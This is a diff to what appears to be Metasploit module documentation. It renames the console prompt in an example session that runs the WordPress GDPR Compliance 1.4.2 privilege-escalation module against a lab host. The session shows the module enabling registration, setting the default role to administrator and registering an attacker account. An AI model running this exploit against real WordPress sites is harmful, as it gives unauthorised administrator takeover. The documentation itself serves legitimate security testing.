@@ -25,24 +25,24 @@ This module changes the admin email (optional) to prevent notification sending, 
 ### Tested on Debian 9.6 running Wordpress 4.7.5 with WordPress GDPR Compliance plugin 1.4.2:
 
 ```
-msf5 > use auxiliary/admin/http/wp_gdpr_compliance_privesc
-msf5 auxiliary(admin/http/wp_gdpr_compliance_privesc) > set verbose true
+msf > use auxiliary/admin/http/wp_gdpr_compliance_privesc
+msf auxiliary(admin/http/wp_gdpr_compliance_privesc) > set verbose true
 verbose => true
-msf5 auxiliary(admin/http/wp_gdpr_compliance_privesc) > set rhosts 172.22.222.145
+msf auxiliary(admin/http/wp_gdpr_compliance_privesc) > set rhosts 172.22.222.145
 rhosts => 172.22.222.145
-msf5 auxiliary(admin/http/wp_gdpr_compliance_privesc) > set email test@example.com
+msf auxiliary(admin/http/wp_gdpr_compliance_privesc) > set email test@example.com
 email => test@example.com
-msf5 auxiliary(admin/http/wp_gdpr_compliance_privesc) > check
+msf auxiliary(admin/http/wp_gdpr_compliance_privesc) > check
 
 [*] Checking /wp-content/plugins/wp-gdpr-compliance/readme.txt
 [*] Found version 1.4.2 of the plugin
 [*] 172.22.222.145:80 The target appears to be vulnerable.
-msf5 auxiliary(admin/http/wp_gdpr_compliance_privesc) > exploit
+msf auxiliary(admin/http/wp_gdpr_compliance_privesc) > exploit
 
 [*] Getting security token from host...
 [!] Enabling user registrations...
 [!] Setting the default user role type to administrator...
 [*] Registering msfuser with email test@example.com
 [*] Auxiliary module execution completed
-msf5 auxiliary(admin/http/wp_gdpr_compliance_privesc) >
+msf auxiliary(admin/http/wp_gdpr_compliance_privesc) >
 ```
